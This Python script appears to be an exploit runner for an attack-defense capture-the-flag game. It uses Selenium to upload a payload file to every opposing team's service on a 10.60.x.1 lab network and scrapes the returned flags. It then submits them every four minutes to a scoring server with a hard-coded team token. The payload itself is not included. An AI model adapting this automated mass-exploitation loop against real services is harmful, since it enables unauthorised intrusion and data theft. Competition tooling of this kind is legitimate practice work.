import requests
from pwn import *
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException, WebDriverException

TEAM_TOKEN = '3e98bc8a3b12fdcad0052bbdb8a31cd7'

def main():
    teams = [ '10.60.4.1', '10.60.41.1', '10.60.38.1', '10.60.21.1', '10.60.3.1', '10.60.29.1', '10.60.12.1', '10.60.13.1', '10.60.33.1', '10.60.10.1', '10.60.35.1', '10.60.39.1', '10.60.9.1', '10.60.20.1', '10.60.23.1', '10.60.25.1', '10.60.16.1', '10.60.26.1', '10.60.31.1', '10.60.37.1', '10.60.19.1', '10.60.6.1', '10.60.1.1', '10.60.32.1', '10.60.8.1', '10.60.5.1', '10.60.2.1', '10.60.27.1', '10.60.34.1', '10.60.11.1', '10.60.42.1', '10.60.0.1', '10.60.40.1', '10.60.30.1', '10.60.17.1', '10.60.43.1', '10.60.36.1', '10.60.22.1', '10.60.7.1', '10.60.28.1', '10.60.14.1', '10.60.24.1', '10.60.18.1', '10.60.15.1']
    flags = list()
    count = 0
    
    while True:
        for _ in teams:
            driver = webdriver.Firefox();
            try:
                driver.get('http://'+_+':5000')
            except WebDriverException:
                driver.close()
                continue
            try:
                driver.find_element(By.ID, "program").send_keys(os.getcwd()+"/program.bin")
            except NoSuchElementException:
                driver.close()
                continue
            driver.find_element(By.ID, 'submit').click()
            flags.append(driver.find_element(By.ID, 'result').text)
            driver.close()

        print(requests.put('http://10.10.0.1:8080/flags', headers={
        'X-Team-Token': TEAM_TOKEN
        }, json=flags).text)
        count = 0
            
        time.sleep(240)


if __name__ == '__main__':
    main()